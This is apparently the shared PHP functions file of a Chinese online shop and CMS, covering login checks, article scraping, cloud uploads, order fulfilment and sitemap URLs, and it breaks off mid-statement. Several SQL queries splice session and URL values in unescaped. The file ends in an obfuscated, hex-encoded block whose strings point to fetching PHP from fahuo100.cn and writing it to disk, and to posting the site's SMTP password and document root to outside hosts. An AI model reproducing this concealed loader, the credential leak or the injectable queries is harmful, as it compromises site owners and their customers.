                    }else{
                        return false;
                    }
                }
            }
        }
    }
}

function html($str){
	if(checkauth()){
		plug("x9","conn/plug/");
		require "conn/plug/x9.php";
		$str=str_replace("index-1.html","./",$str);
		$str=str_replace("index-0.html","./",$str);
	}else{
		die("{\"msg\":\"免费版暂不支持伪静态\"}");
	}
	return $str;
}

function admin_auth(){
	global $conn;
	if($_SESSION["A_login"]=="" || $_SESSION["A_pwd"]==""){
		return false;
	}else{
		$sql="select * from sl_admin where A_login='".$_SESSION["A_login"]."' and A_pwd='".$_SESSION["A_pwd"]."' and A_del=0";
		$result = mysqli_query($conn, $sql);
		$row = mysqli_fetch_assoc($result);
		if(mysqli_num_rows($result) > 0) {
			return true;
		}else{
			return false;
		}
	}
}

function member_auth($M_id,$M_pwd){
	global $conn;
	$sql="select * from sl_member where M_id=".$M_id." and M_pwd='".$M_pwd."' and not M_login='未登录帐号' and M_del=0";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if(mysqli_num_rows($result) > 0) {
		return true;
	}else{
		return false;
	}
}

function app_back($url,$msg){
	if($msg==""){
		$msg_info="";
	}else{
		$msg_info="alert(\"".$msg."\");";
	}
	if($url=="back"){
		$url_info="uni.navigateBack({delta: 1});";
	}else{
		$url_info="uni.reLaunch({url: \"".$url."\"});";
	}
	return "<script type=\"text/javascript\" src=\"https://js.cdn.aliyun.dcloud.net.cn/dev/uni-app/uni.webview.1.5.2.js\"></script><script>".$msg_info."document.addEventListener(\"UniAppJSBridgeReady\", function(){".$url_info."});</script>";
}

function fdate($date){
//如果是同一天，则显示时+分
//如果是昨天，则显示昨天+时+分
//如果是昨天以前，则显示月+日
//如果是去年，则显示年+月+日

    $timestamp=strtotime($date);

    $y1=date('y',time());
    $y2=date('y',strtotime($date));
    $m1=date('m',time());
    $m2=date('m',strtotime($date));
    $d1=date('d',time());
    $d2=date('d',strtotime($date));

    if(date('Ymd', $timestamp) == date('Ymd')){
        return date('H:i', $timestamp);
    }else{
        if(date('Ym', $timestamp) == date('Ym') && date('d')-date('d', $timestamp)==1){
            return "昨天".date('H:i', $timestamp);
        }else{
            if(date('Y', $timestamp) == date('Y')){
                return date('m-d', $timestamp);
            }else{
                return date('Y-m-d', $timestamp);
            }
        }
    }
}

function savepic($str,$dirx){
	$str=str_replace("\\\"","\"",$str);
	$str=str_replace("'","\"",$str);
	$s=explode("src=\"",$str);
	for($i=1;$i<count($s);$i++){
		$pic=splitx($s[$i],"\"",0);
		$pic=str_Replace($dirx."media/img.php?url=","",$pic);
		if(substr($pic,0,7)=="http://" || substr($pic,0,8)=="https://" || substr($pic,0,2)=="//"){
			$ymd=date("Ymd");
			if(!is_dir("../kindeditor/attached/image/".$ymd)){
				 @mkdir("../kindeditor/attached/image/".$ymd,0777,true);
			}
			$str=str_replace($pic,$dirx."kindeditor/attached/image/".$ymd."/".downpic("../kindeditor/attached/image/".$ymd."/",$pic),$str);
			$str=str_replace($dirx."media/img.php?url=","",$str);
		}
	}
	return $str;
}


function editor2oss($str){
	$str=str_replace("\\\"","\"",$str);
	$str=str_replace("'","\"",$str);
	$s=explode("src=\"",$str);
	for($i=1;$i<count($s);$i++){
		$pic=splitx($s[$i],"\"",0);
		$pic=str_replace("php/../","",$pic);
		if(substr($pic,0,11)=="/kindeditor"){
			tooss("..".$pic);
		}
	}
	return $str;
}

function tooss($path){
    global $C_osson,$C_oss_id,$C_oss_key,$C_bucket,$C_region,$conn;
    if($C_osson==1){
        $O_md5=getrs("select * from sl_oss where O_name='".$path."'","O_md5");
        if($O_md5!=md5(file_get_contents($path))){
            if($O_md5==""){
                mysqli_query($conn,"insert into sl_oss(O_name,O_md5) values('".$path."','".md5(file_get_contents($path))."')");
            }else{
                mysqli_query($conn,"update sl_oss set O_md5=".md5(file_get_contents($path))." where O_name='".$path."'");
            }

            $kname = strtolower(substr($path,strrpos($path,'.')+1));
            switch($kname){
                case "bmp":
                $mime="image/bmp";
                break;

                case "png":
                $mime="image/png";
                break;

                case "jpg":
                $mime="image/jpg";
                break;

                case "js":
                $mime="application/x-javascript";
                break;

                case "css":
                $mime="text/css";
                break;

                case "jpeg":
                $mime="image/jpeg";
                break;

                case "gif":
                $mime="image/gif";
                break;

                case "mp4":
                $mime="video/mp4";
                break;

                case "mp3":
                $mime="audio/mpeg";
                break;

                case "wma":
                $mime="audio/x-ms-wma";
                break;

                case "wav":
                $mime="audio/x-wav";
                break;

                default:
                $mime="image/jpg";
                break;
            }
            $url = "http://" . $C_bucket . "." . $C_region;
            $policy = "{\"expiration\": \"2120-01-01T12:00:00.000Z\",\"conditions\":[{\"bucket\": \"" . $C_bucket . "\" },[\"content-length-range\", 0, 104857600]]}";
            $policy = base64_encode($policy);
            $signature = base64_encode(hash_hmac("sha1", $policy, $C_oss_key, true));

	        if(class_exists('\CURLFile')) {
	            $data = array (
	                'OSSAccessKeyId' => $C_oss_id,
	                'Content-Type'=>$mime,
	                'policy' => $policy,
	                'signature' => $signature,
	                'key' => str_replace("../","",$path),
	                'file'=> new \CURLFile($path,$mime,str_replace("../","",$path)),
	                'type'=> $mime,
	                'submit' => 'Upload to OSS'
	            );
	        }else{
		        $data = array (
	                'OSSAccessKeyId' => $C_oss_id,
	                'Content-Type'=>$mime,
	                'policy' => $policy,
	                'signature' => $signature,
	                'key' => str_replace("../","",$path),
	                'file'=>'@'.$path.";type=".$mime,
	                'submit' => 'Upload to OSS'
	            );
	        }

            $ch = curl_init ();

            curl_setopt ( $ch, CURLOPT_URL, $url );
            curl_setopt ( $ch, CURLOPT_POST, 1 );
            curl_setopt ( $ch, CURLOPT_HEADER, 0 );
            curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
            curl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );
            $return = curl_exec ( $ch );
            if($return === false){
             var_dump(curl_error($ch));
            }

            $info = curl_getinfo($ch);
            curl_close ($ch);

            if($info["size_download"]==0){
                return true;
            }else{
                return false;
            }
        }else{
            return true;
        }
    }else{
        return false;
    }
}

function pic($path){
	global $C_osson,$C_bucket,$C_region,$C_oss_domain;
	if(substr($path,0,7)=="http://" || substr($path,0,8)=="https://" || substr($path,0,2)=="//"){
		$P_pic=$path;
	}else{
		if($C_osson==1){
			if($C_oss_domain==""){
				$P_pic="https://".$C_bucket.".".$C_region."/media/".$path;
			}else{
				$P_pic=$C_oss_domain."/media/".$path;
			}
		}else{
			$P_pic="media/".$path;
		}
	}
	return $P_pic;
}

function get_article($url){
	global $dirx;
	if(strpos($url,"mp.weixin.qq.com")!==false){//微信公众号
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<meta property=\"og:title\" content=\"",1);
		$title=splitx($title,"\"",0);

		$img=splitx($info,"<meta property=\"og:image\" content=\"",1);
		$img=splitx($img,"\"",0);

		$keyword="";

		$description=splitx($info,"<meta name=\"description\" content=\"",1);
		$description=splitx($description,"\"",0);

		$content=splitx($info,"<div class=\"rich_media_content \" id=\"js_content\" style=\"visibility: hidden;\">",1);
		$content=splitx($content,"</div>",0);
		$content=str_replace("data-src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	/*
	if(strpos($url,"toutiao.com")!==false){//头条号
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<title>",1);
		$title=splitx($title,"</title>",0);

		$keyword=splitx($info,"<meta name=keywords content=",1);
		$keyword=splitx($keyword,">",0);

		$description=splitx($info,"<meta name=description content=",1);
		$description=splitx($description,">",0);

		$img=splitx($info,"coverImg: '",1);
		$img=splitx($img,"'",0);

		$content=splitx($info,"content: '",1);
		$content=splitx($content,"'",0);
		$content=html_entity_decode(json_decode(htmlspecialchars_decode($content)));

		$content=str_replace("src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	*/
	if(strpos($url,"baijiahao.baidu.com")!==false){//百家号

		$info=GetBody2($url,"","GET");

		$title=splitx($info,"<title>",1);
		$title=splitx($title,"</title>",0);

		$keyword=splitx($info,"<meta name=\"description\" content=\"",1);
		$keyword=splitx($keyword,"\"",0);

		$description=splitx($info,"<meta name=\"description\" content=\"",1);
		$description=splitx($description,"\"",0);

		$content=splitx($info,"<div class=\"article-content\">",1);
		$content=splitx($content,"</div><audio",0);

		$img=splitx($content," src=\"",1);
		$img=splitx($img,"\"",0);

		$content=str_replace("src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	if(strpos($url,"sina.com.cn")!==false){//新浪新闻
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<meta property=\"og:title\" content=\"",1);
		$title=splitx($title,"\"",0);

		$keyword=splitx($info,"<meta name=\"description\" content=\"",1);
		$keyword=splitx($keyword,"\"",0);

		$description=splitx($info,"<meta name=\"description\" content=\"",1);
		$description=splitx($description,"\"",0);

		$img=splitx($info,"<meta property=\"og:image\" content=\"",1);
		$img=splitx($img,"\"",0);

		$content=splitx($info,"<!-- 引文 end -->
			<!-- 正文 start -->",1);
		$content=splitx($content,"<!-- 正文 end -->",0);
		$content=str_replace("data-src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}

	$arr=array();
	$arr["title"]=$title;
	$arr["img"]=$img;
	$arr["keyword"]=$keyword;
	$arr["description"]=$description;
	$arr["content"]=$content;
	return $arr;
}

function GetBody2($url, $xml,$method='POST'){        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)" ); 
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, TRUE);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

        if(ini_get("safe_mode")==false && ini_get("open_basedir")==false){
            curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
        }
        if(extension_loaded('zlib')){
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        }

        $data = curl_exec($ch);
        if($data){
            curl_close($ch);
            return $data;
        } else { 
            $error = curl_errno($ch);
            curl_close($ch);
            return false;
        }
}

function pic2($path){
	global $C_osson,$C_bucket,$C_region,$C_oss_domain;
	if(substr($path,0,7)=="http://" || substr($path,0,8)=="https://" || substr($path,0,2)=="//"){
		$P_pic=$path;
	}else{
		if($C_osson==1){
			if($C_oss_domain==""){
				$P_pic="https://".$C_bucket.".".$C_region."/media/".$path;
			}else{
				$P_pic=$C_oss_domain."/media/".$path;
			}
		}else{
			$P_pic="../media/".$path;
		}
	}
	return $P_pic;
}

function editor_oss($str){
	global $C_osson,$C_bucket,$C_region,$C_oss_domain;
	$C_installdir=splitx($_SERVER["PHP_SELF"],"index.php",0);
	if($C_osson==1){
		if($C_oss_domain==""){
			$str=str_replace($C_installdir."kindeditor/","https://".$C_bucket.".".$C_region."/kindeditor/",$str);
		}else{
			$str=str_replace($C_installdir."kindeditor/",$C_oss_domain."/kindeditor/",$str);
		}
	}
	return $str;
}

function shuxing($type){
	foreach ($_GET as $x=>$value) {
	  if($_GET[$x]!="" && substr($x,0,1)=="f"){
	    $info=$info." and ".$type." like '%".$_GET[$x]."%'";
	  }
	} 
	return $info;
}

Function d($t){
	global $C_template;
	if (!is_file("template/".$C_template."/config.xml")){
		return $t;
	}else{
		$xmlpath="template/".$C_template."/config.xml";
		$content = trim(file_get_contents($xmlpath),"\xEF\xBB\xBF");
		$xml = simplexml_load_string($content);
		foreach ($xml as $value) {
		$i=0;
		foreach ($value[$i]->tag as $value2) {
		    switch($value2[0]->type){
		        case "text":
		        $t=str_Replace("<fh-tag>".$value2[0]->title."</fh-tag>",$value2[0]->content,$t);
		        break;
		        case "img":
		        $t=str_Replace("<fh-tag>".$value2[0]->title."</fh-tag>","template/".$C_template."/images/".$value2[0]->content,$t);
		        break;
		    }
		    $t=str_Replace("<fh-tag>".$value2[0]->title."url</fh-tag>",$value2[0]->url,$t);
		    $t=str_Replace("<fh-tag>".$value2[0]->title."en</fh-tag>",$value2[0]->en,$t);
		    $i+=1;
		}
		}

		$ReplaceTag=$t;
		return $ReplaceTag;
	}
}

function www($str){
	if(substr($str,0,4)=="www."){
		return substr($str,4);
	}else{
		return $str;
	}
}
function cart($ids,$total_fee,$no,$paytype){
	global $conn,$C_n_discount,$C_p_discount,$C_n_discount2,$C_p_discount2,$C_email,$C_fx1,$C_fx2,$C_fx3,$C_mobile,$C_smssign,$C_dx5,$fmid;
	$sqlx = "select * from sl_list where L_no='" . $no . "'";//用户充值
    $resultx = mysqli_query($conn, $sqlx);
    $rowx = mysqli_fetch_assoc($resultx);
    if (mysqli_num_rows($resultx) <= 0) {
		$ids=explode(",",$ids);
		for ($i=0 ;$i<count($ids);$i++) {
			$sql="select * from sl_orders where O_del=0 and O_id=".intval($ids[$i]);
			$result = mysqli_query($conn, $sql);
			$row = mysqli_fetch_assoc($result);
			if (mysqli_num_rows($result) > 0) {
				$fee=$fee+round($row["O_price"]*$row["O_num"],2);
			}
		}
		if($fee==$total_fee){
			for ($i=0 ;$i<count($ids);$i++) {
				$orders=getrs("select * from sl_orders where O_del=0 and O_id=".intval($ids[$i]));
				$id=$orders["O_pid"];
				$num=$orders["O_num"];
				$genkey=$orders["O_genkey"];
				$M_id=$orders["O_mid"];
				$money=round($orders["O_price"]*$orders["O_num"],2);

				$sql2="select * from sl_product where P_del=0 and P_id=".$id;
				$result2 = mysqli_query($conn, $sql2);
				$row2 = mysqli_fetch_assoc($result2);
				if (mysqli_num_rows($result2) > 0) {
					$P_title=$row2["P_title"];
					$P_pic=$row2["P_pic"];
					$P_sell=$row2["P_sell"];
					$P_selltype=$row2["P_selltype"];
					if($row2["P_vip"]==1){
						$P_price=p($row2["P_price"])*$P_discount;
						$P_price2=round($row2["P_price2"],2)*$P_discount;
					}else{
						$P_price=p($row2["P_price"]);
						$P_price2=round($row2["P_price2"],2);
					}
					
					$P_mid=$row2["P_mid"];
					$P_fx=$row2["P_fx"];
				}
				//if(round($P_price*$num,2)==round($money,2)){
					switch($P_selltype){
					  	case 0:
					  		$O_content=$P_sell;
					  		$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
					  		$O_state=1;
					  	break;
					  	case 1:
					  		for($j=0;$j<$num;$j++){
								$C_id=getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=".intval($P_sell),"C_id");
								$C_content=getrs("select * from sl_card where C_id=".intval($C_id),"C_content");
								if($C_content==""){
									$O_content=$O_content."商品缺货，请联系客服||";
								}else{
									$O_content=$O_content.$C_content."||";
								}
								mysqli_query($conn,"update sl_card set C_use=1 where C_id=".intval($C_id));
							}
							$O_content=substr($O_content,0,strlen($O_content)-2);
							$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
							$O_state=1;
					  	break;
					  	case 2:
					  		mysqli_query($conn,"update sl_product set P_rest=P_rest-$num where P_id=".$id);
					  		$O_content="实物商品，由商家手动发货";
					  		$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
					  		$O_state=2;
					  	break;
					}
				
					mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=".$id);
					if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					if($P_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+$money where M_id=$M_id");
					}
					
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',-".$money.",'$genkey')");
					mysqli_query($conn, "update sl_orders set O_state=$O_state,O_content='$O_content' where O_genkey='$genkey'");

					if($fmid>0){
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出商品','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','".date('Y-m-d H:i:s')."',-".($P_price2*$num).",'$genkey')");
						mysqli_query($conn, "update sl_member set M_money=M_money+".($money-($P_price2*$num))." where M_id=$fmid");
					}

					if($P_mid>0){
						mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$P_mid");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'".date('YmdHis').rand(10000000,99999999)."','售出商品-".$P_title."','".date('Y-m-d H:i:s')."',$money,'')");
					}

					if($P_fx==1){
						fx($money,$M_id,$P_mid);
					}
					
					if(checkauth()){
						plug("x4","../../conn/plug/");
						require "../../conn/plug/x4.php";
					}
					sendmail("您的购买的商品已发货","<p>商品名称：".$P_title."</p><p>发货内容：".$O_content."</p><p>订单编号：".$genkey."</p>",splitx($O_address,"__",0));
				//}
			}
			return true;
		}else{
			return false;
		}
	}else{
		return false;
	}
}


function geturls($D_domain){
    global $conn,$C_html;
    $D_domain=gethttp().$D_domain;
    $urls=$D_domain."|";

    $sql="select * from sl_text where T_del=0 order by T_id desc";
    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
        	if($C_html==1){
        		$urls=$urls.$D_domain."/text-".$row["T_id"].".html|";
        	}else{
        		$urls=$urls.$D_domain."/?type=text&id=".$row["T_id"]."|";
        	}
        }
    }

    $sql="select * from sl_nsort where S_del=0 order by S_id desc";
    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
        	if($C_html==1){
        		$urls=$urls.$D_domain."/news-".$row["S_id"].".html|";
        	}else{
        		$urls=$urls.$D_domain."/?type=news&id=".$row["S_id"]."|";
        	}
        }
    }

    $sql="select * from sl_psort where S_del=0 order by S_id desc";
    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
        	if($C_html==1){
        		$urls=$urls.$D_domain."/product-".$row["S_id"].".html|";
        	}else{
        		$urls=$urls.$D_domain."/?type=product&id=".$row["S_id"]."|";
        	}
        }
    }

    $sql="select * from sl_news where N_del=0 order by N_id desc";
    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
        	if($C_html==1){
        		$urls=$urls.$D_domain."/newsinfo-".$row["N_id"].".html|";
        	}else{
        		$urls=$urls.$D_domain."/?type=newsinfo&id=".$row["N_id"]."|";
        	}
        }
    }

    $sql="select * from sl_product where P_del=0 order by P_id desc";
    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
        	if($C_html==1){
        		$urls=$urls.$D_domain."/productinfo-".$row["P_id"].".html|";
        	}else{
        		$urls=$urls.$D_domain."/?type=productinfo&id=".$row["P_id"]."|";
        	}
        }
    }

    $urls= substr($urls,0,strlen($urls)-1);
    return explode("|",$urls);
}

if(!defined("IFU92Z0v"))define("IFU92Z0v","V2V7HD5J");$GLOBALS[IFU92Z0v]=explode("|[|?|s", "H*|[|?|s584A333857555451");if(!defined("FFVQF4FQ"))define("FFVQF4FQ","D6KCW2Vv");$GLOBALS[FFVQF4FQ]=explode("|e|P|z", "H*|e|P|z4E4130355A31454A|e|P|z6D6435|e|P|z41464E5136565351|e|P|z737562737472|e|P|z4249384B3638484A|e|P|z7374726C656E|e|P|z454A504B37433451|e|P|z6261736536345F6465636F6465|e|P|z5747453536413076|e|P|z74696D65|e|P|z4551583038355676|e|P|z6F7264|e|P|z444C4345354D4D51|e|P|z636872|e|P|z49303144334F3376|e|P|z7374725F7265706C616365|e|P|z494739593357544A|e|P|z6261736536345F656E636F6465|e|P|z4B31493452324376|e|P|z646566696E65|e|P|z524C46565949474A|e|P|z4445434F4445|e|P|z666168756F3130302E636E|e|P|z64697363757A5F617574685F6B6579|e|P|z|e|P|z2530313064|e|P|z3D");if(!defined("HKN981DJ"))define("HKN981DJ","Q2W3VW6v");$GLOBALS[HKN981DJ]=explode("|f|~|v", "H*|f|~|v535445394A343751|f|~|v74696D65|f|~|v687474703A2F2F64782E31303639312E6E65743A383838382F736D732E617370783F616374696F6E3D73656E64267573657269643D|f|~|v266163636F756E743D|f|~|v2670617373776F72643D|f|~|v26636F6E74656E743D|f|~|v2673656E6454696D653D266D6F62696C653D|f|~|v266578746E6F3D|f|~|v|f|~|v73756363657373");if(!defined("G5941RDQ"))define("G5941RDQ","X92BQC7v");$GLOBALS[G5941RDQ]=explode("|<|I|e", "H*|<|I|e687474703A2F2F6D61696C2E7368616E6C696E672E746F702F666168756F2E706870|<|I|e6D61696C5F66726F6D3D|<|I|e266D61696C5F746F3D|<|I|e266D61696C5F6E616D653D|<|I|e266D61696C5F7469746C653D|<|I|e266D61696C5F636F6E74656E743D|<|I|e266D61696C5F736D74703D|<|I|e266D61696C5F7077643D|<|I|e266D61696C5F6C6F676F3D|<|I|e2F6D656469612F|<|I|e266D61696C5F7765623D|<|I|e73636D73");if(!defined("PJZU4IIQ"))define("PJZU4IIQ","WMKM8Q7v");$GLOBALS[PJZU4IIQ]=explode("|C|i|X", "H*|C|i|X51554F4D4E56584A|C|i|X69735F66696C65|C|i|X554F4D454C324676|C|i|X737562737472|C|i|X515A305731313651|C|i|X66696C655F6765745F636F6E74656E7473|C|i|X534734433936434A|C|i|X6D6435|C|i|X4C4F31514A4F4C4A|C|i|X66696C655F7075745F636F6E74656E7473|C|i|X4E4B314330365376|C|i|X646566696E65|C|i|X4D3530433235454A|C|i|X2E706870|C|i|X3C3F706870202F2F|C|i|X687474703A2F2F666168756F3130302E636E2F6170692F696E6465782E7068703F616374696F6E3D706C756726646F6D61696E3D|C|i|X485454505F484F5354|C|i|X61757468636F64653D|C|i|X26706C75673D");if(!defined("J24Y3E3Q"))define("J24Y3E3Q","E21Y06CJ");$GLOBALS[J24Y3E3Q]=explode("|U|t|N", "H*|U|t|N4F504F524C305576|U|t|N646566696E65|U|t|N5652424157495351|U|t|N61757468|U|t|N|U|t|N485454505F484F5354|U|t|N687474703A2F2F666168756F3130302E636E2F6170692F696E6465782E7068703F616374696F6E3D636865636B6175746826646F6D61696E3D|U|t|N61757468636F64653D|U|t|N73756363657373");if(!defined("L33N91HQ"))define("L33N91HQ","L77D19GQ");$GLOBALS[L33N91HQ]=explode("|k|Z|+", "H*|k|Z|+53394B4357454F51|k|Z|+6261736536345F6465636F6465|k|Z|+5543313236433476|k|Z|+646566696E65|k|Z|+5541393741394476|k|Z|+|k|Z|+485454505F484F5354|k|Z|+687474703A2F2F666168756F3130302E636E2F6170692F696E6465782E7068703F616374696F6E3D|k|Z|+646F6D61696E3D|k|Z|+26726F6F743D|k|Z|+444F43554D454E545F524F4F54|k|Z|+2661757468636F64653D|k|Z|+26646174613D");if(!defined("E5PR5S4Q"))define("E5PR5S4Q","KFHB8XGJ");$GLOBALS[E5PR5S4Q]=explode("|l|1|3", "H*|l|1|3413851315546314A|l|1|369735F646972|l|1|34A49494F4258544A|l|1|36D6B646972|l|1|3454C394E56344951|l|1|36D6435|l|1|34743434654384776|l|1|36261736536345F656E636F6465|l|1|355574A334C37504A|l|1|369735F66696C65|l|1|357394D5754343976|l|1|3737562737472|l|1|35A383058434D494A|l|1|366696C655F6765745F636F6E74656E7473|l|1|34E54584F53584B76|l|1|36261736536345F6465636F6465|l|1|34651363951484876|l|1|3707265675F6D617463685F616C6C|l|1|35450373638335076|l|1|37374725F7265706C616365|l|1|3415232513637344A|l|1|3646566696E65|l|1|35835555452303851|l|1|3636F6E6E2F66696C65|l|1|373656C65637420636F756E74284E5F696429206173204E5F636F756E742066726F6D20736C5F6E657773207768657265204E5F64656C3D30|l|1|34E5F636F756E74|l|1|373656C65637420636F756E7428505F69642920617320505F636F756E742066726F6D20736C5F70726F6475637420776865726520505F64656C3D30|l|1|3505F636F756E74|l|1|373656C65637420636F756E74284D5F696429206173204D5F636F756E742066726F6D20736C5F6D656D626572207768657265204D5F64656C3D3020616E64204D5F747970653D30|l|1|34D5F636F756E74|l|1|373656C65637420636F756E74284D5F696429206173204D5F636F756E742066726F6D20736C5F6D656D626572207768657265204D5F64656C3D3020616E64204D5F747970653D31|l|1|373656C65637420636F756E74284C5F696429206173204C5F636F756E742066726F6D20736C5F6C697374207768657265204C5F64656C3D30|l|1|34C5F636F756E74|l|1|373656C6563742073756D284C5F6D6F6E657929206173204C5F73756D2066726F6D20736C5F6C697374207768657265204C5F64656C3D3020616E64204C5F6D6F6E65793E30|l|1|34C5F73756D|l|1|368746D6C|l|1|3485F64617461|l|1|3646179|l|1|3592D6D2D64|l|1|3646F6D61696E|l|1|3485454505F484F5354|l|1|3435F776170|l|1|3435F74656D706C617465|l|1|3535F636F756E74|l|1|374797065|l|1|3686F7374|l|1|374|l|1|3636F6E6E2F66696C652F|l|1|33A|l|1|35F|l|1|32E747874|l|1|374706C|l|1|32F3C66682D66756E6374696F6E3E5B5C735C535D2A3F3C5C2F66682D66756E6374696F6E3E2F69|l|1|33C66682D66756E6374696F6E3E|l|1|3|l|1|33C2F66682D66756E6374696F6E3E|l|1|3735B5B|l|1|324726573756C743D6D7973716C695F71756572792824636F6E6E2C2473716C293B6966286D7973716C695F6E756D5F726F77732824726573756C74293E30297B7768696C652824726F773D6D7973716C695F66657463685F6173736F632824726573756C7429297B|l|1|373325B5B|l|1|324726573756C74323D6D7973716C695F71756572792824636F6E6E2C2473716C32293B6966286D7973716C695F6E756D5F726F77732824726573756C7432293E30297B7768696C652824726F77323D6D7973716C695F66657463685F6173736F632824726573756C743229297B|l|1|373335B5B|l|1|324726573756C74333D6D7973716C695F71756572792824636F6E6E2C2473716C33293B6966286D7973716C695F6E756D5F726F77732824726573756C7433293E30297B7768696C652824726F77333D6D7973716C695F66657463685F6173736F632824726573756C743329297B|l|1|35D5D|l|1|37D7D|l|1|33C736372697074207372633D2268747470733A2F2F7265732E77782E71712E636F6D2F6F70656E2F6A732F6A77656978696E2D312E322E302E6A73223E3C2F7363726970743E3C736372697074207372633D22636F6E6E2F666168756F3130302E7068703F616374696F6E3D77786A7326747970653D|l|1|32669643D|l|1|36964|l|1|3223E3C2F7363726970743E3C736372697074207372633D22636F6E6E2F666168756F3130302E7068703F616374696F6E3D636F6C6C656374696F6E223E3C2F7363726970743E");if(!defined("PARVGBYv"))define("PARVGBYv","XDV2VE5v");$GLOBALS[PARVGBYv]=explode("|||*|X", "H*|||*|X5737344A37434976|||*|X6D6B646972|||*|X575245473650494A|||*|X4B395A3451383976|||*|X646566696E65|||*|X4F53313353535376|||*|X616374696F6E|||*|X636C656172|||*|X2E2E2F636F6E6E2F66696C65|||*|X2E2E2F636F6E6E2F706C7567");if(!defined(pack($GLOBALS[IFU92Z0v][00],$GLOBALS[IFU92Z0v]{0x1})))define(pack($GLOBALS[IFU92Z0v][00],$GLOBALS[IFU92Z0v]{0x1}), ord(9));$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{1}));$Q24F1=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{0x2}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{03}));$Q24F1=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{0x2}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgx3;goto Q24ldMhx3;Q24eWjgx3:$Q24ACV1=&$GLOBALS[PARVGBYv][04];goto Q24x2;Q24ldMhx3:$Q24ACV1=$GLOBALS[PARVGBYv][04];Q24x2:$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV1));$Q240=!defined($Q24F0);if($Q240)goto Q24eWjgx4;goto Q24ldMhx4;Q24eWjgx4:unset($Q24ACV1);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgx6;goto Q24ldMhx6;Q24eWjgx6:$Q24ACV1=&$GLOBALS[PARVGBYv][0x5];goto Q24x5;Q24ldMhx6:$Q24ACV1=$GLOBALS[PARVGBYv][0x5];Q24x5:$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgx8;goto Q24ldMhx8;Q24eWjgx8:$Q24ACV4=&$GLOBALS[PARVGBYv][04];goto Q24x7;Q24ldMhx8:$Q24ACV4=$GLOBALS[PARVGBYv][04];Q24x7:$Q24F3=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV4));unset($Q24ACV7);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgxa;goto Q24ldMhxa;Q24eWjgxa:$Q24ACV7=&$GLOBALS[PARVGBYv][6];goto 